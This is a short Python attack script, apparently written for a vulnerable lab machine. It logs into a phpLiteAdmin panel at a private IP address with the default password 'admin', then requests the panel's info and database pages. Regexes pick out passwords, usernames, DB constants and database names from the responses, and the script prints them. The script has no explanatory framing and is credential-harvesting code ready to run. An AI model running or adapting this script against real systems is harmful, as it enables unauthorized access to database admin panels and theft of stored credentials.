import urllib.request, urllib.parse, socket, re, http.cookiejar
socket.setdefaulttimeout(15)
base = "http://192.168.18.132"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login first
login_url = base + "/dbadmin/test_db.php"
post_data = urllib.parse.urlencode({"password": "admin", "login": "Login"}).encode()
req = urllib.request.Request(login_url, data=post_data, headers={
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
})
resp = opener.open(req, timeout=10)

print("=== Exploring phpLiteAdmin ===")
# Try to access info or database list
params = [
    ("action", "info"),
    ("action", "databases"),
    ("", "")
]

for action, value in [("action=info", "info"), ("action=databases", "databases")]:
    try:
        url = login_url + "?" + action
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = opener.open(req, timeout=10)
        content = resp.read().decode("utf-8", errors="ignore")
        print(f"\n--- {value} ---")
        # Look for passwords, usernames
        creds = re.findall(r'(password|passwd|user|root|admin|zico|DB_\w+|localhost)[\s:=]+[^\s<]+', content, re.I)
        for c in creds[:20]:
            print(f"  {c}")
        # Show relevant content
        if "password" in content.lower() or "user" in content.lower():
            print(f"  Full content preview: {content[:800]}")
    except Exception as e:
        print(f"  Error: {e}")

# Try browsing databases
print("\n=== Trying to find tables with credentials ===")
try:
    req = urllib.request.Request(login_url, headers={"User-Agent": "Mozilla/5.0"})
    resp = opener.open(req, timeout=10)
    content = resp.read().decode("utf-8", errors="ignore")
    
    # Find database names
    dbs = re.findall(r'(database_id|db|select).*?value=["\x27]([^"\x27]+)["\x27]', content, re.I)
    for db in dbs[:10]:
        print(f"  Database: {db}")
    
    # Find any visible user/password info
    users = re.findall(r'(\w+)\s*[:=]\s*([a-zA-Z0-9@_]+)', content)
    for u, p in users[:15]:
        if any(x in u.lower() for x in ['user', 'pass', 'root', 'admin', 'zico']):
            print(f"  {u} = {p}")
except Exception as e:
    print(f"  Error: {e}")
